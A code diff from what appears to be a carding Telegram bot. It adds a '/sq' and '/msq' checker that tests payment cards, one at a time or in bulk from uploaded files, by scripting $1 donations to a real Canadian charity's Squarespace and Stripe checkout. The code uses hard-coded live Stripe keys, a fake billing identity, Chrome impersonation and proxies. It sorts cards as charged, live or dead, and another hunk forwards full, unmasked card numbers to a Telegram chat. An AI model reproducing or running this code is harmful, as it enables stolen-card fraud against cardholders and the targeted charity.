@@ -251,6 +251,7 @@ MASS_CHECK_GATEWAY_TASK_DICT_NAMES = {
     "autosopi": "autosopi_active_tasks",
     "mst": "strip5_active_tasks",
     "msk": "stripe_sk_active_tasks",
+    "msq": "sq_active_tasks",
 }
 
 
@@ -3977,21 +3978,46 @@ async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: s
         # Get current time
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        # Truncate card for display (only show partial for safety)
+        # Full card is shown in the scrape feed
         card_preview = card
-        
-        # Format the hit message (clean, no user info) - SHORTER to avoid 400 error
+
+        # Clean the response text — strip a trailing "<price> $ 🔥" so we
+        # show just the status, e.g. "ORDER_PLACED".
+        clean_response = str(response).strip()
+        clean_response = re.sub(r'\s*\d+\.?\d*\s*\$\s*🔥?\s*$', '', clean_response).strip()
+        clean_response = re.sub(r'\s*[\$🔥]+\s*$', '', clean_response).strip()
+        if len(clean_response) > 100:
+            clean_response = clean_response[:97] + "..."
+
+        # Resolve the country flag (fall back to a name lookup, then 🌍).
+        flag_emoji = "🌍"
+        try:
+            if country_code and str(country_code).upper() not in ("N/A", "XX", ""):
+                flag_emoji = get_flag_emoji_from_country_code(country_code)
+            if flag_emoji == "🌍" and country and str(country).upper() != "N/A":
+                _name_flags = {
+                    'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UNITED STATES OF AMERICA': '🇺🇸',
+                    'UK': '🇬🇧', 'UNITED KINGDOM': '🇬🇧', 'CANADA': '🇨🇦',
+                    'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪',
+                    'SPAIN': '🇪🇸', 'GERMANY': '🇩🇪', 'FRANCE': '🇫🇷',
+                    'ITALY': '🇮🇹', 'NETHERLANDS': '🇳🇱', 'BRAZIL': '🇧🇷',
+                    'MEXICO': '🇲🇽', 'JAPAN': '🇯🇵', 'CHINA': '🇨🇳',
+                    'PHILIPPINES': '🇵🇭', 'NIGERIA': '🇳🇬', 'SOUTH AFRICA': '🇿🇦',
+                }
+                flag_emoji = _name_flags.get(str(country).upper().strip(), flag_emoji)
+        except Exception:
+            flag_emoji = "🌍"
+
+        # Format the hit message — monospace card, bold everything else.
         hit_message = (
-            f"💳 HIT DETECTED\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"Card: {card_preview}\n"
-            f"Gateway: {gateway}\n"
-            f"Response: {response[:100]}\n"
-            f"Price: {price}\n"
-            f"BIN: {bin_info_text}\n"
-            f"Bank: {bank}\n"
-            f"Country: {country}\n"
-            f"Time: {timestamp}"
+            f"💎 <b>SCRAPE {gateway}</b>\n"
+            f"\n"
+            f"<code>{card_preview}</code>\n"
+            f"  ⤷<b>{clean_response}</b>\n"
+            f"\n"
+            f"<b>{bin_info_text}</b>\n"
+            f"<b>{bank}</b>\n"
+            f"<b>{flag_emoji} {country}</b>"
         )
         
         # Make sure message is not too long (Telegram limit is 4096)
@@ -4022,6 +4048,8 @@ async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: s
                             "chat_id": HIT_FORWARDER_CHAT_ID,
                             "text": hit_message.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                         }
+                        # NOTE: <code> tags are stripped too, so the fallback
+                        # still delivers the full card on parse errors.
                         async with session.post(send_url, json=payload_no_html) as resp2:
                             if resp2.status == 200:
                                 print(f"📤 [HIT FORWARDER] Successfully forwarded (plain text)")
@@ -12412,6 +12440,7 @@ class GatewayManager:
             "auto_stripe": {"enabled": True, "name": "Auto Stripe", "emoji": "⚡"},
             "dabbagh": {"enabled": True, "name": "Dabbagh Stripe", "emoji": "💳"},
             "united_way": {"enabled": True, "name": "United Way", "emoji": "💳"},
+            "square_1usd": {"enabled": True, "name": "Square 1$", "emoji": "🟦"},
             
             # Razorpay
             "razorpay": {"enabled": True, "name": "Razorpay", "emoji": "💰"},
@@ -23977,6 +24006,7 @@ class UserManager:
     FREE_TIER_CREDIT_GATEWAYS = [
         "shopify",           # /sh  (free users with credits: 1 credit per card)
         "stripe_sk",         # /sk
+        "square_1usd",       # /sq
         "paypal",
         "bt_kaffn8",
         "braintree",       # /bt command checks this key
@@ -24043,6 +24073,7 @@ class UserManager:
                 "whop",
                 "stco",
                 "jhit",
+                "square_1usd",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -24101,6 +24132,7 @@ class UserManager:
                 "st1",
                 "stripe_sk",
                 "bt_kaffn8",     # /bt reply-flow checks this key
+                "square_1usd",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -24155,6 +24187,7 @@ class UserManager:
                 "princess",
                 "st1",
                 "stripe_sk",
+                "square_1usd",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -33575,6 +33608,934 @@ async def strip5_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
     
       
         
+# ============================================================
+#  SQUARE 1$  —  investinginchildren.on.ca (Squarespace + Stripe)
+#  Commands: /sq (single)  |  /msq (mass)
+#  Ported from the standalone square-stripe1 checker.
+# ============================================================
+
+try:
+    from curl_cffi import requests as _sq_creq
+    SQ_CURL_AVAILABLE = True
+except Exception:
+    _sq_creq = None
+    SQ_CURL_AVAILABLE = False
+    print("⚠️ [SQUARE] curl_cffi not installed — /sq and /msq will be unavailable")
+
+# ---- Config -------------------------------------------------
+SQ_TARGET_URL = "https://investinginchildren.on.ca"
+SQ_DONATE_URL = f"{SQ_TARGET_URL}/donate-now"
+
+SQ_WEBSITE_ID   = "516c1d38e4b0e454d77848a3"
+SQ_FUND_ID      = "dafce5db-237e-404a-b24f-4a0a0b674d30"
+SQ_FORM_ID      = "5581a5f1e4b09feecc473d2e"
+SQ_DONATION_API = (
+    f"{SQ_TARGET_URL}/api/v1/fund-service/websites/"
+    f"{SQ_WEBSITE_ID}/donations/funds/{SQ_FUND_ID}"
+)
+
+SQ_STRIPE_PK         = "pk_live_spccNRfymMvPy4eckmMk5q3d"
+SQ_STRIPE_ACCOUNT    = "acct_2VnCsucNAqr4ITKtdr5j"
+SQ_STRIPE_JS_VERSION = "a18b998a52"
+
+SQ_FIRST    = "vipul"
+SQ_LAST     = "shaw"
+SQ_EMAIL    = "cpusy17@gmail.com"
+SQ_ADDRESS1 = "3790 South Las Vegas Boulevard"
+SQ_CITY     = "Las Vegas"
+SQ_STATE    = "NV"
+SQ_ZIP_CODE = "89109"
+SQ_COUNTRY  = "US"
+
+SQ_AMOUNT_CENTS = 100
+SQ_AMOUNT_STR   = str(SQ_AMOUNT_CENTS)
+SQ_AMOUNT_LABEL = "$1.00"
+SQ_FREQ         = "ONE_TIME"
+SQ_LABEL        = "Square 1$"
+
+SQ_TIMEOUT       = 25
+SQ_COOKIE_DOMAIN = ".investinginchildren.on.ca"
+
+SQ_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/136.0.0.0 Safari/537.36"
+)
+
+sq_active_tasks = {}
+
+
+# ---- Helpers -------------------------------------------------
+def _sq_log(m):
+    print(f"[SQ {time.strftime('%H:%M:%S')}] {m}")
+
+
+def _sq_stripe_id() -> str:
+    return str(uuid.uuid4()) + uuid.uuid4().hex[:6]
+
+
+def _sq_make_session(proxy=None):
+    kwargs = {"impersonate": "chrome136"}
+    if proxy:
+        kwargs["proxies"] = {"http": proxy, "https": proxy}
+    s = _sq_creq.Session(**kwargs)
+    s.headers.update({
+        "user-agent":         SQ_UA,
+        "accept-language":    "en-US,en;q=0.9",
+        "sec-ch-ua":          '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        "sec-ch-ua-mobile":   "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-gpc":            "1",
+    })
+    return s
+
+
+def _sq_sync_crumb(s, resp, tag=""):
+    try:
+        j = resp.json()
+    except Exception:
+        return
+    if not isinstance(j, dict):
+        return
+    nc = j.get("crumb")
+    if nc and isinstance(nc, str) and len(nc) > 10:
+        try:
+            s.cookies.set("crumb", nc, domain=SQ_COOKIE_DOMAIN)
+        except Exception:
+            try:
+                s.cookies.set("crumb", nc)
+            except Exception:
+                pass
+        _sq_log(f"    crumb rotated ({tag}): {nc[:30]}...")
+
+
+# ---- Steps ---------------------------------------------------
+def _sq_step_warmup(s):
+    r = s.get(SQ_DONATE_URL, timeout=SQ_TIMEOUT,
+              headers={"accept": "text/html,application/xhtml+xml",
+                       "sec-fetch-dest": "document",
+                       "sec-fetch-mode": "navigate",
+                       "sec-fetch-site": "none"})
+    _sq_log(f"[1] GET /donate-now  HTTP {r.status_code}  len={len(r.text)}")
+    _sq_sync_crumb(s, r, "warmup")
+
+
+def _sq_step_create_cart(s, amount_cents: int = 100) -> str:
+    payload = {
+        "amount": {"value": amount_cents, "currencyCode": "CAD"},
+        "donationFrequency": SQ_FREQ,
+        "feeAmount": None,
+        "formSubmission": {
+            "formId": SQ_FORM_ID,
+            "formResponses": json.dumps({
+                "textarea-yui_3_17_2_1_1434559101343_8360": {
+                    "value": "", "type": "textarea", "empty": True,
+                    "title": "Whatinspiredyoutomakeadonationtoourcause",
+                    "rawTitle": "What inspired you to make a donation to our cause?",
+                    "id": "textarea-yui_3_17_2_1_1434559101343_8360"},
+                "name-yui_3_17_2_1_1434559101343_7549": {
+                    "values": {"Last": "", "First": ""}, "empty": True, "type": "name",
+                    "title": "Ifyouaremakingadonationinhonourofsomeonepleasetypetheirnamebelow",
+                    "rawTitle": "If you are making a donation in honour of someone, please type their name below.",
+                    "id": "name-yui_3_17_2_1_1434559101343_7549"},
+                "textarea-yui_3_17_2_1_1434559101343_12075": {
+                    "value": "", "type": "textarea", "empty": True,
+                    "title": "Anyothercomments",
+                    "rawTitle": "Any other comments?",
+                    "id": "textarea-yui_3_17_2_1_1434559101343_12075"},
+            }),
+        },
+    }
+
+    crumb = s.cookies.get("crumb") or ""
+    r = s.post(SQ_DONATION_API, timeout=SQ_TIMEOUT,
+               headers={
+                   "accept":         "application/json, text/plain, */*",
+                   "content-type":   "application/json",
+                   "origin":         SQ_TARGET_URL,
+                   "referer":        SQ_DONATE_URL,
+                   "sec-fetch-dest": "empty",
+                   "sec-fetch-mode": "cors",
+                   "sec-fetch-site": "same-origin",
+                   "x-csrf-token":   crumb,
+                   "x-crumb":        crumb,
+               }, json=payload)
+    _sq_log(f"[2] POST donation  HTTP {r.status_code}  len={len(r.text)}")
+    _sq_sync_crumb(s, r, "create_cart")
+
+    if r.status_code >= 400:
+        raise RuntimeError(f"donation POST {r.status_code}: {r.text[:200]}")
+
+    j = r.json()
+    redirect = j.get("redirectUrlPath") or j.get("redirectUrl") or ""
+    m = re.search(r'[?&]cartToken=([A-Za-z0-9_\-]+)', redirect)
+    if not m:
+        for k in ("cartToken", "cart_token", "token"):
+            if k in j:
+                return str(j[k])
+        raise RuntimeError(f"no cartToken: {json.dumps(j)[:200]}")
+    return m.group(1)
+
+
+def _sq_step_shipping(s, cart_id: str):
+    url = f"{SQ_TARGET_URL}/api/v1/commerce-checkout-service/carts/{cart_id}/shipping/location"
+    crumb = s.cookies.get("crumb") or ""
+    r = s.put(url, timeout=SQ_TIMEOUT,
+              headers={
+                  "accept":         "application/json, text/plain, */*",
+                  "content-type":   "application/json",
+                  "origin":         SQ_TARGET_URL,
+                  "referer":        f"{SQ_TARGET_URL}/checkout?cartToken={cart_id}",
+                  "sec-fetch-dest": "empty",
+                  "sec-fetch-mode": "cors",
+                  "sec-fetch-site": "same-origin",
+                  "x-csrf-token":   crumb,
+                  "x-crumb":        crumb,
+              }, json={
+                  "firstName": SQ_FIRST, "lastName": SQ_LAST, "phoneNumber": "",
+                  "line1": SQ_ADDRESS1, "line2": "", "city": SQ_CITY,
+                  "region": SQ_STATE, "postalCode": SQ_ZIP_CODE, "country": SQ_COUNTRY,
+              })
+    _sq_log(f"[3] PUT shipping/location  HTTP {r.status_code}")
+    _sq_sync_crumb(s, r, "shipping")
+
+
+def _sq_step_stripe_pm(card, guid, muid, sid, proxy=None):
+    client_sess = str(uuid.uuid4())
+    data = {
+        "type":                                  "card",
+        "card[number]":                          card["number"],
+        "card[cvc]":                             card["cvv"],
+        "card[exp_month]":                       card["month"],
+        "card[exp_year]":                        card["year"],
+        "billing_details[name]":                 f"{SQ_FIRST} {SQ_LAST}",
+        "billing_details[email]":                SQ_EMAIL,
+        "billing_details[address][country]":     SQ_COUNTRY,
+        "billing_details[address][postal_code]": SQ_ZIP_CODE,
+        "billing_details[address][city]":        SQ_CITY,
+        "billing_details[address][state]":       SQ_STATE,
+        "billing_details[address][line1]":       SQ_ADDRESS1,
+        "billing_details[address][line2]":       "",
+        "allow_redisplay":                       "unspecified",
+        "pasted_fields":                         "number",
+        "guid":                                  guid,
+        "muid":                                  muid,
+        "sid":                                   sid,
+        "key":                                   SQ_STRIPE_PK,
+        "_stripe_account":                       SQ_STRIPE_ACCOUNT,
+        "payment_user_agent":                    f"stripe.js/{SQ_STRIPE_JS_VERSION}; stripe-js-v3/{SQ_STRIPE_JS_VERSION}; payment-element; deferred-intent",
+        "referrer":                              SQ_TARGET_URL,
+        "time_on_page":                          str(random.randint(30000, 900000)),
+        "client_attribution_metadata[client_session_id]":             client_sess,
+        "client_attribution_metadata[merchant_integration_source]":   "elements",
+        "client_attribution_metadata[merchant_integration_subtype]":  "payment-element",
+        "client_attribution_metadata[merchant_integration_version]":  "2021",
+        "client_attribution_metadata[payment_intent_creation_flow]":  "deferred",
+        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
+    }
+    r = _sq_creq.post("https://api.stripe.com/v1/payment_methods",
+                      headers={
+                          "accept":         "application/json",
+                          "content-type":   "application/x-www-form-urlencoded",
+                          "origin":         "https://js.stripe.com",
+                          "referer":        "https://js.stripe.com/",
+                          "user-agent":     SQ_UA,
+                          "sec-fetch-dest": "empty",
+                          "sec-fetch-mode": "cors",
+                          "sec-fetch-site": "same-site",
+                      }, data=data, impersonate="chrome136",
+                      proxies={"http": proxy, "https": proxy} if proxy else None,
+                      timeout=SQ_TIMEOUT)
+    j = r.json()
+    if "error" in j:
+        raise RuntimeError(f"Stripe PM: {j['error'].get('message', str(j)[:200])}")
+    pm_id = j.get("id", "")
+    if not pm_id.startswith("pm_"):
+        raise RuntimeError(f"Bad pm_id: {json.dumps(j)[:200]}")
+    ci = j.get("card", {})
+    _sq_log(f"[4] pm_id={pm_id}  brand={ci.get('brand')}  last4={ci.get('last4')}")
+    return pm_id
+
+
+def _sq_step_charge(s, cart_id, pm_id, _attempt=1):
+    payload = {
+        "email": SQ_EMAIL, "subscribeToList": True,
+        "shippingAddress": {
+            "id": "", "firstName": SQ_FIRST, "lastName": SQ_LAST,
+            "line1": SQ_ADDRESS1, "line2": "", "city": SQ_CITY,
+            "region": SQ_STATE, "postalCode": SQ_ZIP_CODE, "country": SQ_COUNTRY,
+            "phoneNumber": "",
+        },
+        "createNewUser": False, "newUserPassword": None,
+        "saveShippingAddress": False, "makeDefaultShippingAddress": False,
+        "customFormData": None, "shippingAddressId": None,
+        "proposedAmountDue": {"decimalValue": SQ_AMOUNT_STR, "currencyCode": "CAD"},
+        "cartToken": cart_id,
+        "paymentToken": {
+            "stripePaymentTokenType": "PAYMENT_METHOD_ID",
+            "token": pm_id, "type": "STRIPE",
+        },
+        "reCaptchaToken": None, "billToShippingAddress": False,
+        "billingAddress": {
+            "id": "", "firstName": SQ_FIRST, "lastName": SQ_LAST,
+            "line1": SQ_ADDRESS1, "line2": "", "city": SQ_CITY,
+            "region": SQ_STATE, "postalCode": SQ_ZIP_CODE, "country": SQ_COUNTRY,
+            "phoneNumber": "",
+        },
+        "savePaymentInfo": False, "makeDefaultPayment": False,
+        "paymentCardId": None, "universalPaymentElementEnabled": True,
+    }
+    crumb = s.cookies.get("crumb") or ""
+    r = s.post(f"{SQ_TARGET_URL}/api/2/commerce/orders", timeout=SQ_TIMEOUT,
+               headers={
+                   "accept":         "application/json, text/plain, */*",
+                   "content-type":   "application/json",
+                   "origin":         SQ_TARGET_URL,
+                   "referer":        f"{SQ_TARGET_URL}/checkout?cartToken={cart_id}",
+                   "sec-fetch-dest": "empty",
+                   "sec-fetch-mode": "cors",
+                   "sec-fetch-site": "same-origin",
+                   "x-csrf-token":   crumb,
+                   "x-crumb":        crumb,
+               }, json=payload)
+    _sq_log(f"[5] POST /api/2/commerce/orders  HTTP {r.status_code}  len={len(r.text)}")
+    try:
+        j = r.json()
+    except Exception:
+        return {"_raw": r.text[:400], "_status": r.status_code}
+
+    if j.get("crumbFail") or "crumb" in str(j.get("error", "")).lower():
+        nc = j.get("crumb") or ""
+        if nc:
+            try:
+                s.cookies.set("crumb", nc, domain=SQ_COOKIE_DOMAIN)
+            except Exception:
+                pass
+        if _attempt < 3:
+            time.sleep(0.6)
+            return _sq_step_charge(s, cart_id, pm_id, _attempt + 1)
+    return j
+
+
+# ---- Verdict -------------------------------------------------
+SQ_APPROVED_KEYWORDS = [
+    "insufficient_funds", "insufficient funds",
+    "incorrect_cvc", "incorrect cvc",
+    "expired_card", "expired card",
+    "authentication_required", "authentication_failure",
+    "3ds", "requires_action",
+    "card_velocity_exceeded", "velocity",
+    "transaction_not_allowed",
+    "restricted_card", "restricted card",
+    "payment_method_not_supported",
+    "invalid_amount",
+]
+
+SQ_DECLINED_KEYWORDS = [
+    "generic_decline", "generic decline",
+    "do_not_honor", "do not honor",
+    "invalid_number", "invalid number",
+    "invalid card number", "card number is incorrect",
+    "invalid_expiry", "invalid expiry", "invalid_exp",
+    "no such", "no_such_card",
+    "pickup_card", "pickup card",
+    "lost_card", "stolen_card",
+    "fraud", "security violation",
+    "call_issuer", "refer to",
+    "card_declined",
+    "was declined",
+    "unknown_card", "unknown card",
+    "nonexistent",
+    "invalid_account",
+]
+
+
+def _sq_scan(text: str) -> str:
+    t = (text or "").lower()
+    for kw in SQ_DECLINED_KEYWORDS:
+        if kw in t:
+            return "DECLINED"
+    for kw in SQ_APPROVED_KEYWORDS:
+        if kw in t:
+            return "APPROVED"
+    return "UNKNOWN"
+
+
+def _sq_detail(j) -> str:
+    if not isinstance(j, dict):
+        return ""
+    parts = []
+    ft = j.get("failureType")
+    ek = j.get("errorKey")
+    st = j.get("paymentState")
+    err = j.get("error")
+    if ft:
+        parts.append(f'"failureType": "{ft}"')
+    if ek:
+        parts.append(f'"errorKey": "{ek}"')
+    if st:
+        parts.append(f'"paymentState": "{st}"')
+    if isinstance(err, str):
+        parts.append(f'"error": "{err[:80]}"')
+    if isinstance(err, dict) and err.get("message"):
+        parts.append(f'"error.message": "{err["message"][:80]}"')
+    return "  ".join(parts)
+
+
+def _sq_verdict(j):
+    if not isinstance(j, dict):
+        return "UNKNOWN", str(j)[:120]
+
+    if j.get("id") and j.get("paymentState"):
+        state = (j.get("paymentState") or "").upper()
+        ref = j.get("orderNumber") or j.get("id")
+        if state == "PAID":
+            return "CHARGED", f"Order {ref} - PAID"
+        if state == "AUTHORIZED":
+            return "APPROVED", f"Order {ref} - AUTHORIZED"
+        if state == "PENDING":
+            return "APPROVED", f"Order {ref} - PENDING"
+        if state == "PARTIALLY_PAID":
+            return "APPROVED", f"Order {ref} - PARTIALLY_PAID"
+        if state == "FAILED":
+            return "DECLINED", f"Order {ref} - FAILED"
+        if state == "NOT_CHARGED":
+            return "ERROR", f"Order {ref} - NOT_CHARGED"
+        return "CHARGED", f"Order {ref} - {state}"
+
+    if "failureType" in j:
+        ft = (j.get("failureType") or "").upper()
+        ek = j.get("errorKey") or ""
+        if ft == "INVALID_PAYMENT_AMOUNT":
+            min_amt = j.get("minimumPaymentAmount") or {}
+            return "ERROR", f"INVALID_PAYMENT_AMOUNT - min {min_amt.get('decimalValue', '?')} CAD"
+        cls = _sq_scan(ek) or _sq_scan(ft)
+        if cls == "APPROVED":
+            return "APPROVED", f"{ft} / {ek}" if ek else ft
+        return "DECLINED", f"{ft} / {ek}" if ek else ft
+
+    err = ""
+    if isinstance(j.get("error"), dict):
+        err = j["error"].get("message", "") or ""
+    elif isinstance(j.get("error"), str):
+        err = j["error"]
+
+    if err:
+        cls = _sq_scan(err)
+        if cls == "APPROVED":
+            return "APPROVED", err[:150]
+        if cls == "DECLINED":
+            return "DECLINED", err[:150]
+        if j.get("crumbFail") or "crumb" in err.lower():
+            return "ERROR", f"crumb rejected - {err[:80]}"
+        return "ERROR", err[:150]
+
+    if j.get("crumbFail"):
+        return "ERROR", "crumb rejected"
+
+    if "_raw" in j:
+        cls = _sq_scan(j["_raw"])
+        if cls == "APPROVED":
+            return "APPROVED", j["_raw"][:150]
+        if cls == "DECLINED":
+            return "DECLINED", j["_raw"][:150]
+        return "ERROR", j["_raw"][:200]
+
+    return "UNKNOWN", json.dumps(j)[:150]
+
+
+def _sq_check_sync(card, amount_cents: int = 100, proxy=None):
+    guid, muid, sid = _sq_stripe_id(), _sq_stripe_id(), _sq_stripe_id()
+    s = _sq_make_session(proxy)
+    cart_id = ""
+    pm_id = ""
+    result = {}
+
+    try:
+        _sq_step_warmup(s)
+        cart_id = _sq_step_create_cart(s, amount_cents=amount_cents)
+        _sq_step_shipping(s, cart_id)
+        pm_id = _sq_step_stripe_pm(card, guid, muid, sid, proxy)
+        result = _sq_step_charge(s, cart_id, pm_id)
+        v, msg = _sq_verdict(result)
+        return {"verdict": v, "message": msg, "raw_code": v,
+                "pm_id": pm_id, "cart_id": cart_id,
+                "detail": _sq_detail(result), "raw": result}
+    except Exception as e:
+        return {"verdict": "ERROR", "message": str(e)[:150], "raw_code": "EXCEPTION",
+                "pm_id": pm_id, "cart_id": cart_id,
+                "detail": "", "raw": result}
+
+
+async def sq_check_card(card_str: str, proxy: str = None) -> dict:
+    """Async wrapper: parse the card, then run the blocking checker in a thread."""
+    if not SQ_CURL_AVAILABLE:
+        return {"verdict": "ERROR", "message": "curl_cffi not installed on the bot host",
+                "raw_code": "NO_CURL", "detail": "", "raw": {}}
+    parts = card_str.split("|")
+    if len(parts) < 4:
+        return {"verdict": "ERROR", "message": "Bad card format",
+                "raw_code": "BAD_FORMAT", "detail": "", "raw": {}}
+    card = {
+        "number": re.sub(r"\D", "", parts[0]),
+        "month":  parts[1].zfill(2),
+        "year":   parts[2][-2:],
+        "cvv":    re.sub(r"\D", "", parts[3]),
+    }
+    try:
+        return await asyncio.to_thread(_sq_check_sync, card, SQ_AMOUNT_CENTS, proxy)
+    except Exception as e:
+        return {"verdict": "ERROR", "message": f"thread error: {str(e)[:80]}",
+                "raw_code": "THREAD_ERROR", "detail": "", "raw": {}}
+
+
+def sq_parse_response(res: dict) -> Tuple[str, str]:
+    """
+    Map the checker verdict to the bot's mass-check categories:
+        CHARGED  -> charged (shown + hit notification)
+        LIVE     -> approved (shown, no hit notification)
+        DECLINED -> dead (hidden)
+        ERROR    -> error (hidden)
+    """
+    v = (res.get("verdict") or "UNKNOWN").upper()
+    msg = res.get("message") or ""
+    if v == "CHARGED":
+        return "CHARGED", msg or "Order PAID"
+    if v == "APPROVED":
+        return "LIVE", msg or "Approved / Live"
+    if v == "DECLINED":
+        return "DECLINED", msg or "Declined"
+    return "ERROR", msg or "Unknown"
+
+
+def sq_format_result(status_category: str, response_text: str,
+                     card: str, bin_info: tuple, elapsed: float) -> str:
+    bin_info_text, bank, country, _, _ = bin_info
+
+    if status_category == "CHARGED":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
+    elif status_category == "LIVE":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("approved", "6266787022111773140"), "✅")
+    elif status_category == "DECLINED":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+    else:
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("error", "6282641460093260838"), "⚠️")
+
+    clean_resp = response_text[:80]
+    country_name = (country or "Unknown").replace("🌐", "").strip()
+
+    return (
+        f"<b>Square 1$</b> {premium_emoji('5895770017458294953', '💫')}\n\n"
+        f"{premium_emoji('5893494861612455015', '⭐️')} 𝗖𝗔𝗥𝗗 ↣ <code>{card}</code>\n\n"
+        f"{emoji} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{clean_resp}</code>\n"
+        f"{premium_emoji('6039802097916974085', '🪙')} 𝗣𝗿𝗶𝗰𝗲 ↣ <b>{SQ_AMOUNT_LABEL}</b>\n\n"
+        f"{premium_emoji('5902242339899838759', '🌐')} 𝗕𝗜𝗡 ↣ <b>{bin_info_text}</b>\n"
+        f"{premium_emoji('6041705726206808304', '🚀')} 𝗕𝗮𝗻𝗸 ↣ <b>{bank}</b>\n"
+        f"{premium_emoji('5904542823167824187', '🗑')} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{country_name}</b>"
+    )
+
+
+# ============================================================
+#   /sq  —  SINGLE CHECK
+# ============================================================
+@check_gateway("square_1usd")
+async def sq_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check via Square 1$ (investinginchildren.on.ca)."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if not context.args:
+        await message.reply_text(
+            "🟦 <b>Square 1$ — Single Check</b>\n\n"
+            "Usage: <code>/sq &lt;card&gt;</code>\n"
+            "Example: <code>/sq 4242424242424242|12|2029|123</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    card = card_formatter.extract_single_card_from_text(" ".join(context.args).strip())
+    if not card:
+        await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
+        return
+
+    # Gateway access is checked BEFORE credits so free users aren't charged
+    # for a gateway their tier can't use.
+    if not await require_gateway_access(user_id, "square_1usd", message):
+        return
+
+    can_proceed, err = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    await sq_single_logic(update, context, card)
+
+
+async def sq_single_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                          card: str):
+    """Run the Square 1$ check for one card (caller handles access/credits)."""
+    user_id = update.effective_user.id
+    message = update.effective_message
+    tier = user_manager.get_tier(user_id)
+    status_msg = await message.reply_text("🔄 Checking card with Square 1$...")
+
+    try:
+        proxy_url = None
+        if user_manager.can_use_proxy(user_id):
+            raw_proxy = None
+            if user_id in autosopi_proxy_tracker.working_proxies and \
+               autosopi_proxy_tracker.working_proxies[user_id]:
+                raw_proxy = autosopi_proxy_tracker.working_proxies[user_id][0]
+            elif global_proxy_pool.enabled and global_proxy_pool.proxies:
+                raw_proxy = global_proxy_pool.get_next_proxy()
+            if raw_proxy:
+                proxy_url = format_proxy(raw_proxy)
+
+        t0 = time.time()
+        res = await sq_check_card(card, proxy_url)
+        elapsed = time.time() - t0
+
+        status_category, response_text = sq_parse_response(res)
+        bin_info = await get_bin_info(card)
+        ui = sq_format_result(status_category, response_text, card, bin_info, elapsed)
+
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ("CHARGED", "LIVE"):
+            await save_hit_to_file(
+                card=card, gateway=SQ_LABEL,
+                response=response_text, price=SQ_AMOUNT_LABEL,
+                bin_info=bin_info, user_id=user_id, user_tier=tier)
+
+            if status_category == "CHARGED":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway=SQ_LABEL,
+                    card=card, response=response_text, price=SQ_AMOUNT_LABEL,
+                    user=user_data, bin_info=bin_info,
+                    status_category="charged")
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Square single] {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+
+
+# ============================================================
+#   /msq  —  MASS CHECK
+# ============================================================
+@check_gateway("square_1usd")
+async def sq_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass check via Square 1$ (investinginchildren.on.ca)."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if not await require_gateway_access(user_id, "square_1usd", message):
+        return
+
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use <code>/sq &lt;card&gt;</code> for single checks.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    cards = []
+    reply_msg = message.reply_to_message
+
+    # 1) Cards typed after the command: /msq card1 card2 ...
+    if context.args:
+        for tok in " ".join(context.args).split():
+            c = card_formatter.extract_single_card_from_text(tok)
+            if c:
+                cards.append(c)
+
+    # 2) Reply to a .txt/.csv file → download and parse it
+    if not cards and reply_msg and reply_msg.document:
+        try:
+            file = await reply_msg.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode("utf-8", errors="ignore")
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    c = card_formatter.extract_single_card_from_text(line)
+                    if c:
+                        cards.append(c)
+        except Exception as e:
+            await message.reply_text(f"❌ File read error: {str(e)[:100]}")
+            return
+
+    # 3) Reply to a card file the bot already parsed and cached
+    if not cards and user_id in pending_files:
+        cached = pending_files.get(user_id) or {}
+        if cached.get("type") == "cards" or cached.get("cards"):
+            cards = list(cached.get("cards", []))
+            pending_files.pop(user_id, None)
+
+    # 4) Reply to a text message that contains card(s)
+    if not cards and reply_msg and (reply_msg.text or reply_msg.caption):
+        replied_text = reply_msg.text or reply_msg.caption or ""
